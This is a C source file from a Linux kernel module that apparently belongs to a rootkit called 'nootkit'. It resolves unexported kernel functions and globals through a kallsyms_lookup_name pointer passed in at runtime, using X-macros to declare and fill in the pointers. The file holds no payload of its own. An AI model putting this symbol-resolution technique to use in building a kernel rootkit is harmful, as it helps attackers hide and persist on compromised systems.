#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/printk.h>

#include <ksyms.h>

unsigned long (*ksyms__kallsyms_lookup_name)(const char *name) = 0;

/**
 * Define all function symbols as global function pointers initialized to NULL.
 */
#define KSYM_FUNC(retn, symbol, ...) \
retn (*ksyms__##symbol)(__VA_ARGS__) = NULL
KSYMS_FUNCTIONS();
#undef KSYM_FUNC

/**
 * Define all globals as global function pointers initialized to NULL.
 */
#define KSYM_GLOBAL(type, symbol) \
type *ksyms__##symbol = NULL;
KSYMS_GLOBALS();
#undef KSYM_GLOBAL


int resolve_ksyms(void *kallsyms_lookup_name) {
    ksyms__kallsyms_lookup_name = kallsyms_lookup_name;

    /**
     * Resolve all defined symbols, returning on any failure.
     */
    #define KSYM_FUNC(retn, symbol, ...) KSYM_GLOBAL(retn, symbol)
    #define KSYM_GLOBAL(type, symbol)                                                   \
    do {                                                                                \
        ksyms__##symbol = (void *)ksyms__kallsyms_lookup_name(#symbol);                 \
        if (ksyms__##symbol == NULL) {                                                  \
            printk(KERN_ERR "nootkit: ksyms: Symbol %s failed to resolve", #symbol);    \
            return 1;                                                                   \
        }                                                                               \
    } while (0)
    KSYMS_FUNCTIONS();
    KSYMS_GLOBALS();
    #undef KSYM_FUNC
    #undef KSYM_GLOBAL

    return 0;
}
